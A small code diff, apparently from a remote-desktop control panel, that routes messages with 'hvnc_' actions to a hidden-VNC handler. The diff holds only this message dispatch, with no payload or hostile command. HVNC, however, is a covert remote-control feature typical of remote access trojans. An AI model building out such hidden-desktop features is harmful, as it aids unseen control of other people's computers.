@@ -933,6 +933,13 @@
         }
         return;
       }
+      // HVNC: Handle all hvnc_ prefixed actions
+      if (parsed.action && parsed.action.startsWith("hvnc_")) {
+        if (remdesk.hvnc && remdesk.hvnc.handleResponse) {
+          remdesk.hvnc.handleResponse(parsed);
+        }
+        return;
+      }
       if (Array.isArray(parsed.files)) {
         if (typeof parsed.path === "string") {
           state.remoteCurrentPath = parsed.path;
